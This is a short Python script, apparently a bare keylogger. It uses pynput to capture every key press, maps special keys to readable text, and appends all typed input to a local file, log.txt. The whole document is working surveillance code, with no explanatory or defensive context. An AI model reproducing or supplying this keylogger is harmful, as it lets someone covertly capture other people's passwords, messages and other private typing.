from pynput.keyboard import Listener

logFile = "log.txt"

def writeLog(key):
    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": " ENTER ",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.tab": "",
        "Key.ctrl_l": "",
        "Key.backspace": " BACKSPACE ",
    }

    keydata = str(key)

    keydata = keydata.replace("'", "")

    for key in translate_keys:
        keydata = keydata.replace(key, translate_keys[key])

    with open(logFile, "a") as f:
        f.write(keydata)

with Listener(on_press=writeLog) as l:
    l.join()
